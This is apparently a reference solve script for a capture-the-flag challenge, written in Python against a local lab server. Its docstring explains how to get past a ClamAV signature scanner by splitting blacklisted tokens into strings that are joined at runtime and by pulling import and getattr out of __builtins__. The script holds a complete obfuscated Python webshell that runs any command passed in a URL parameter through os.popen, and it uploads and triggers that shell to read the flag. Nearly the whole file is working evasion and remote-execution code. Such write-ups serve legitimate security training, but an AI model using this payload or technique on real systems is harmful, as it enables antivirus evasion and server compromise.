#!/usr/bin/env python3
"""
Reference solve script for [is1ab] H0w to byp455.

Idea:
  - Our baby "AV" is a real ClamAV engine loaded with a custom signature
    database that matches a handful of literal byte patterns commonly
    seen in naive Python webshells: process-spawning calls, dynamic
    imports of the OS module, and the eval/exec/open builtins.
  - It only compares raw bytes, it doesn't understand Python semantics.
    So we split every blacklisted token into string pieces that get
    concatenated at *runtime*, after the scanner has already looked at
    the file. `__builtins__` inside the runner's code-execution sandbox
    is a dict (that's what Python always injects there when you pass a
    custom globals dict of your own), so
    we pull the import hook / attribute getter out of it by key instead
    of writing them as literal identifiers.
  - We read command output via a pipe-based call (not the "one-liner"
    fire-and-forget form) because the runner only captures Python-level
    stdout (contextlib.redirect_stdout); the fire-and-forget form writes
    straight to the real fd 1 and its output never makes it back into
    the HTTP response.

  NOTE: this docstring is deliberately vague about the exact blacklisted
  tokens (see sigs/custom.ndb for the real list) so that this file can
  itself be uploaded/inspected without tripping the very AV it explains.

Usage:
    python3 solve.py http://127.0.0.1:8090
"""
import re
import sys

import requests

PAYLOAD = """\
b = __builtins__
imp = b['__im' + 'port__']
osmod = imp('o' + 's')
popenfunc = b['g' + 'etattr'](osmod, 'po' + 'pen')
print(popenfunc(request.args.get('c', 'id')).read())
"""


def solve(base_url: str, cmd: str = "cat /flag") -> str:
    base_url = base_url.rstrip("/")

    # 1) upload the bypass payload
    r = requests.post(
        f"{base_url}/",
        files={"webshell": ("shell.py", PAYLOAD, "text/x-python")},
        timeout=15,
    )
    r.raise_for_status()

    m = re.search(r'/run/([A-Za-z0-9._-]+\.py)', r.text)
    if not m:
        raise RuntimeError(f"upload was not accepted, response:\n{r.text}")
    shell_path = f"/run/{m.group(1)}"

    # 2) run it and make it execute our command
    r = requests.get(f"{base_url}{shell_path}", params={"c": cmd}, timeout=15)
    r.raise_for_status()
    return r.text.strip()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8090"
    print(solve(target))
